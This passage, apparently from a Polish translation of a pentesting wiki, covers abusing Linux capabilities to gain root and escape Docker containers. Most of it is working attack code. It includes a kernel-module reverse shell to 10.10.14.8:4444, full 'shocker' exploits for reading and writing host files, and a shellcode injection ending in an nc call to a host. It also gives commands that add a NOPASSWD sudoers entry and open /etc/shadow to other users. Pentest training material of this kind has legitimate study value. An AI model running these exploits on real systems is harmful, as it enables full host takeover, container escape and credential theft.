gid=0(root)
groups=0(root
```
List **procesy** działające w **hoście** `ps -eaf`

1. Uzyskaj **architekturę** `uname -m`
2. Znajdź **shellcode** dla architektury ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Znajdź **program** do **wstrzykiwania** **shellcode** do pamięci procesu ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Zmień** **shellcode** w programie i **skompiluj** go `gcc inject.c -o inject`
5. **Wstrzyknij** go i zdobądź swoją **powłokę**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** upoważnia proces do **ładowania i usuwania modułów jądra (`init_module(2)`, `finit_module(2)` i `delete_module(2)` system calls)**, oferując bezpośredni dostęp do podstawowych operacji jądra. Ta zdolność stwarza poważne zagrożenia dla bezpieczeństwa, ponieważ umożliwia eskalację uprawnień i całkowite naruszenie systemu, pozwalając na modyfikacje jądra, a tym samym omijając wszystkie mechanizmy zabezpieczeń Linuxa, w tym moduły zabezpieczeń Linuxa i izolację kontenerów.  
**To oznacza, że możesz** **wstawiać/usuwać moduły jądra w/ze jądra maszyny hosta.**

**Przykład z binarnym**

W poniższym przykładzie binarny **`python`** ma tę zdolność.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Domyślnie polecenie **`modprobe`** sprawdza listę zależności i pliki map w katalogu **`/lib/modules/$(uname -r)`**.\
Aby to wykorzystać, stwórzmy fałszywy folder **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Następnie **skompiluj moduł jądra, który możesz znaleźć w 2 przykładach poniżej i skopiuj** go do tego folderu:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Na koniec wykonaj potrzebny kod Pythona, aby załadować ten moduł jądra:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Przykład 2 z binarnym**

W następującym przykładzie binarny **`kmod`** ma tę zdolność.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Co oznacza, że możliwe jest użycie polecenia **`insmod`** do wstawienia modułu jądra. Postępuj zgodnie z poniższym przykładem, aby uzyskać **reverse shell**, nadużywając tego uprawnienia.

**Przykład z środowiskiem (wyjście z Dockera)**

Możesz sprawdzić włączone uprawnienia wewnątrz kontenera docker za pomocą:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyjściu możesz zobaczyć, że zdolność **SYS\_MODULE** jest włączona.

**Utwórz** **moduł jądra**, który będzie wykonywał powłokę odwrotną oraz **Makefile**, aby go **skompilować**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Pusty znak przed każdym słowem make w pliku Makefile **musi być tabulatorem, a nie spacjami**!
{% endhint %}

Wykonaj `make`, aby skompilować.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
W końcu uruchom `nc` w jednej powłoce i **załaduj moduł** z innej, a przechwycisz powłokę w procesie nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Kod tej techniki został skopiowany z laboratorium "Abusing SYS\_MODULE Capability" z** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Inny przykład tej techniki można znaleźć w [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia procesowi **ominięcie uprawnień do odczytu plików oraz do odczytu i wykonywania katalogów**. Jego główne zastosowanie dotyczy wyszukiwania lub odczytu plików. Jednak pozwala również procesowi na użycie funkcji `open_by_handle_at(2)`, która może uzyskać dostęp do dowolnego pliku, w tym tych poza przestrzenią montowania procesu. Uchwycony użyty w `open_by_handle_at(2)` powinien być nieprzezroczystym identyfikatorem uzyskanym za pomocą `name_to_handle_at(2)`, ale może zawierać wrażliwe informacje, takie jak numery i-node, które są podatne na manipulacje. Potencjał do wykorzystania tej możliwości, szczególnie w kontekście kontenerów Docker, został zaprezentowany przez Sebastiana Krahmera za pomocą exploita shocker, jak analizowano [tutaj](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Oznacza to, że możesz** **ominięcie kontroli uprawnień do odczytu plików oraz kontroli uprawnień do odczytu/wykonywania katalogów.**

**Przykład z binarnym**

Binarne będzie mogło odczytać dowolny plik. Więc, jeśli plik taki jak tar ma tę możliwość, będzie mógł odczytać plik shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Przykład z binary2**

W tym przypadku załóżmy, że binarka **`python`** ma tę zdolność. Aby wylistować pliki roota, możesz zrobić:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Aby odczytać plik, możesz zrobić:
```python
print(open("/etc/shadow", "r").read())
```
**Przykład w środowisku (wyjście z Dockera)**

Możesz sprawdzić włączone możliwości wewnątrz kontenera dockera, używając:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyniku można zobaczyć, że zdolność **DAC\_READ\_SEARCH** jest włączona. W rezultacie kontener może **debugować procesy**.

Możesz dowiedzieć się, jak działa poniższe wykorzystanie w [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ale w skrócie **CAP\_DAC\_READ\_SEARCH** nie tylko pozwala nam przechodzić przez system plików bez sprawdzania uprawnień, ale także wyraźnie usuwa wszelkie kontrole do _**open\_by\_handle\_at(2)**_ i **może pozwolić naszemu procesowi na dostęp do wrażliwych plików otwartych przez inne procesy**.

Oryginalny exploit, który nadużywa tych uprawnień do odczytu plików z hosta, można znaleźć tutaj: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), poniżej znajduje się **zmodyfikowana wersja, która pozwala wskazać plik, który chcesz odczytać jako pierwszy argument i zrzucić go do pliku.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
Eksploit musi znaleźć wskaźnik do czegoś zamontowanego na hoście. Oryginalny exploit używał pliku /.dockerinit, a ta zmodyfikowana wersja używa /etc/hostname. Jeśli exploit nie działa, być może musisz ustawić inny plik. Aby znaleźć plik, który jest zamontowany w hoście, wystarczy wykonać polecenie mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Kod tej techniki został skopiowany z laboratorium "Abusing DAC\_READ\_SEARCH Capability" z** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Z **misją promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów z technologii i cyberbezpieczeństwa w każdej dziedzinie.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Oznacza to, że możesz obejść kontrole uprawnień do zapisu w dowolnym pliku, więc możesz zapisać dowolny plik.**

Jest wiele plików, które możesz **nadpisać, aby podnieść uprawnienia,** [**możesz znaleźć pomysły tutaj**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Przykład z binarnym**

W tym przykładzie vim ma tę zdolność, więc możesz modyfikować dowolny plik, taki jak _passwd_, _sudoers_ lub _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Przykład z binarnym 2**

W tym przykładzie **`python`** będzie miał tę zdolność. Możesz użyć pythona do nadpisania dowolnego pliku:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Przykład z środowiskiem + CAP\_DAC\_READ\_SEARCH (wyjście z Dockera)**

Możesz sprawdzić włączone możliwości wewnątrz kontenera dockera, używając:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Najpierw przeczytaj poprzednią sekcję, która [**wykorzystuje zdolność DAC\_READ\_SEARCH do odczytu dowolnych plików**](linux-capabilities.md#cap\_dac\_read\_search) hosta i **skompiluj** exploit.\
Następnie **skompiluj następującą wersję exploita shocker**, która pozwoli ci **zapisywać dowolne pliki** w systemie plików hosta:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Aby wydostać się z kontenera docker, możesz **pobrać** pliki `/etc/shadow` i `/etc/passwd` z hosta, **dodać** do nich **nowego użytkownika** i użyć **`shocker_write`**, aby je nadpisać. Następnie **uzyskaj dostęp** przez **ssh**.

**Kod tej techniki został skopiowany z laboratorium "Abusing DAC\_OVERRIDE Capability" z** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Oznacza to, że możliwe jest zmienienie właściciela dowolnego pliku.**

**Przykład z binarnym**

Załóżmy, że **`python`** ma tę zdolność, możesz **zmienić** **właściciela** pliku **shadow**, **zmienić hasło roota** i eskalować uprawnienia:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Lub z binarnym plikiem **`ruby`** mającym tę zdolność:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Oznacza to, że możliwe jest zmienienie uprawnień dowolnego pliku.**

**Przykład z binarnym**

Jeśli python ma tę zdolność, możesz zmodyfikować uprawnienia pliku shadow, **zmienić hasło roota** i eskalować uprawnienia:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Oznacza to, że możliwe jest ustawienie efektywnego identyfikatora użytkownika utworzonego procesu.**

**Przykład z binarnym**

Jeśli python ma tę **zdolność**, możesz bardzo łatwo to wykorzystać do eskalacji uprawnień do roota:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Inny sposób:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Oznacza to, że możliwe jest ustawienie efektywnego identyfikatora grupy utworzonego procesu.**

Jest wiele plików, które możesz **nadpisać, aby zwiększyć uprawnienia,** [**możesz zaczerpnąć pomysły stąd**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Przykład z binarnym**

W tym przypadku powinieneś szukać interesujących plików, które grupa może odczytać, ponieważ możesz udawać dowolną grupę:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Gdy znajdziesz plik, który możesz wykorzystać (poprzez odczyt lub zapis) do eskalacji uprawnień, możesz **uzyskać powłokę, udając interesującą grupę** za pomocą:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
W tym przypadku grupa shadow została podszyta, więc możesz odczytać plik `/etc/shadow`:
```bash
cat /etc/shadow
```
Jeśli **docker** jest zainstalowany, możesz **udawać** **grupę docker** i nadużyć jej, aby komunikować się z [**gniazdem docker** i eskalować uprawnienia](./#writable-docker-socket).

## CAP\_SETFCAP

**Oznacza to, że możliwe jest ustawienie możliwości na plikach i procesach**

**Przykład z binarką**

Jeśli python ma tę **możliwość**, możesz bardzo łatwo nadużyć jej, aby eskalować uprawnienia do roota:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Zauważ, że jeśli ustawisz nową zdolność dla binarnego pliku z CAP\_SETFCAP, stracisz tę zdolność.
{% endhint %}

Gdy masz [zdolność SETUID](linux-capabilities.md#cap\_setuid), możesz przejść do jej sekcji, aby zobaczyć, jak eskalować uprawnienia.

**Przykład z środowiskiem (wyjście z Dockera)**

Domyślnie zdolność **CAP\_SETFCAP jest przyznawana procesowi wewnątrz kontenera w Dockerze**. Możesz to sprawdzić, wykonując coś takiego:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Ta zdolność pozwala na **przyznanie dowolnej innej zdolności binarnym**, więc możemy pomyśleć o **ucieczce** z kontenera **wykorzystując dowolne inne wyłamania zdolności** wspomniane na tej stronie.\
Jednakże, jeśli spróbujesz przyznać na przykład zdolności CAP\_SYS\_ADMIN i CAP\_SYS\_PTRACE binarnemu gdb, odkryjesz, że możesz je przyznać, ale **binarne nie będzie mogło się wykonać po tym**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: To jest **ograniczający nadzbiór dla efektywnych możliwości**, które wątek może przyjąć. Jest to również ograniczający nadzbiór dla możliwości, które mogą być dodane do zestawu dziedziczonego przez wątek, który **nie ma możliwości CAP\_SETPCAP** w swoim efektywnym zestawie._\
Wygląda na to, że możliwości dozwolone ograniczają te, które mogą być używane.\
Jednak Docker również domyślnie przyznaje **CAP\_SETPCAP**, więc możesz być w stanie **ustawić nowe możliwości w dziedziczonych**.\
Jednak w dokumentacji tej możliwości: _CAP\_SETPCAP : \[…] **dodaje każdą możliwość z ograniczonego** zestawu wątku wywołującego do jego zestawu dziedziczonego_.\
Wygląda na to, że możemy tylko dodawać do zestawu dziedziczonego możliwości z zestawu ograniczonego. Co oznacza, że **nie możemy umieścić nowych możliwości, takich jak CAP\_SYS\_ADMIN lub CAP\_SYS\_PTRACE w zestawie dziedzicznym, aby eskalować uprawnienia**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) zapewnia szereg wrażliwych operacji, w tym dostęp do `/dev/mem`, `/dev/kmem` lub `/proc/kcore`, modyfikację `mmap_min_addr`, dostęp do wywołań systemowych `ioperm(2)` i `iopl(2)`, oraz różne polecenia dyskowe. `FIBMAP ioctl(2)` jest również włączone za pomocą tej możliwości, co spowodowało problemy w [przeszłości](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Zgodnie z dokumentacją, umożliwia to również posiadaczowi opisowe `wykonywanie szeregu operacji specyficznych dla urządzeń na innych urządzeniach`.

Może to być przydatne do **eskalacji uprawnień** i **wyjścia z Dockera.**

## CAP\_KILL

**To oznacza, że możliwe jest zabicie dowolnego procesu.**

**Przykład z binarnym**

Załóżmy, że **`python`** ma tę możliwość. Jeśli mógłbyś **również zmodyfikować jakąś konfigurację usługi lub gniazda** (lub jakikolwiek plik konfiguracyjny związany z usługą), mógłbyś wprowadzić tylne drzwi, a następnie zabić proces związany z tą usługą i czekać na wykonanie nowego pliku konfiguracyjnego z twoimi tylnymi drzwiami.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc z kill**

Jeśli masz uprawnienia kill i działa **program node jako root** (lub jako inny użytkownik), prawdopodobnie możesz **wysłać** mu **sygnał SIGUSR1** i sprawić, że **otworzy debugger node**, do którego możesz się połączyć.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Z **misją promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów z dziedziny technologii i cyberbezpieczeństwa w każdej dyscyplinie.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Oznacza to, że możliwe jest nasłuchiwanie na dowolnym porcie (nawet na portach uprzywilejowanych).** Nie można bezpośrednio eskalować uprawnień za pomocą tej zdolności.

**Przykład z binarnym**

Jeśli **`python`** ma tę zdolność, będzie mógł nasłuchiwać na dowolnym porcie i nawet łączyć się z niego z innym portem (niektóre usługi wymagają połączeń z portów o określonych uprawnieniach)

{% tabs %}
{% tab title="Listen" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Połączenie" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

